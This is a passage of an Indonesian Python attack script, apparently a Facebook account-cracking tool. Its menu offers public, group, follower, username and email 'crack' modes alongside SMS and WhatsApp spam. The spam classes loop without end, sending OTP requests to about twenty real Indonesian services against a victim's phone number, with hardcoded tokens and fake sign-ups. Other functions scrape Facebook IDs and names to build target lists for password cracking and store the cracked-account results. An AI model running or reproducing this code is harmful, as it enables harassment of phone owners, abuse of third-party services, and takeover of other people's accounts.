	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Publick  [bold white][[bold green] ON [bold white]][/]                [bold white][[bold green]07[/][bold white]][/] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Massal [bold white][[bold green] ON [bold white]]                  [bold white][[bold green]08[/][bold white]][/] [bold cyan]Cek Hasil CP [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Username [bold white][[bold green] ON [bold white]]                [bold white][[bold green]09[/][bold white]][/] [bold cyan]Spam Whatsapp [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Crack Grup [bold white][[bold green] ON [bold white]][/]                    [bold white][[bold green]10[/][bold white]][/] [bold cyan]Spam Sms [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Crack Followers [bold white][[bold green] ON [bold white]]               [bold white][[bold green]11[/][bold white]][/] [bold cyan]Report Bug [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Crack Email [bold white][[bold green] ON [bold white]]                   [bold white][[bold red]00[/][bold white]][/] [bold red]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",padding=(0,8),style=f"bold white"))
	cetak(panel(f'[bold Red]    Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack : {P}')
	if _____xyzon___xd____ in ['1','01']:
		xyzoncrackpublik()
	elif _____xyzon___xd____ in ['2','02']:
		dump_massal()
	elif _____xyzon___xd____ in ['3','03']:
		crack_nama()
	elif _____xyzon___xd____ in('4','04'):
		crack_group()
	elif _____xyzon___xd____ in('5','05'):
		pengikut()
	elif _____xyzon___xd____ in('6','06'):
		crack_email()
	elif _____xyzon___xd____ in('7','07'):
		result()
	elif _____xyzon___xd____ in('99','099'):
		mendaftar()
	elif _____xyzon___xd____ in('8','08'):
		file_cp()
	elif _____xyzon___xd____ in('9','09'):
		spam_wa()
	elif _____xyzon___xd____ in('10','10'):
		spam_sms()
	elif _____xyzon___xd____ in('11','11'):
		cetak(panel(f"\33[1;96mApapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold cyan"))
		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
		time.sleep(3)
		exit()
	elif _____xyzon___xd____ in('ahhhhh','vvvk'):
		os.system("xdg-open https://yandex.eu/")
	elif _____xyzon___xd____ in('0','00'):
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+]{m} Sukses Logout{x}')
		time.sleep(5)
		login()
	else:
		print(' [+]\33[1;91m Pilih Yang Bener Asu ')
		back()
def error():
	print(f' [+]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#-------------------[ DOA HALAL ]-----------------------#
def doa_halal():
	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : [bold cyan]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : [bold cyan]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='bold white'))
#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''  [bold cyan]Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f''' [bold cyan]  Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" \33[1;96mSukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
	
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {P}[{H}+{P}] \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"\33[1;96mBerhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] \33[1;91mKoneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] \33[1;91mGagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()

#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    {O}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r\33[1;96m Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel(f'[bold cyan]Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" {P}[{H}+{P}] \33[1;91mMasukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'[bold cyan]Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" {P}[{H}+{P}]\33[1;91m Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'[bold cyan]Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
		
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel('[bold cyan] Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : {P}')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] \33[1;91m Gagal Dump Id Grup, Kemungkinan Grup Private')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1; Valve Steam GameOverlay/1679680416) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r {P}[{H}+{P}]\33[1;96m Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Hasil CP[/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f'{P}[{H}+{P}]\33[1;96m Pilih : {P}')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] \33[1;91m File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' [+] \33[1;96mAnda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] \33[1;91mPilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+]\33[1;96mFile Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
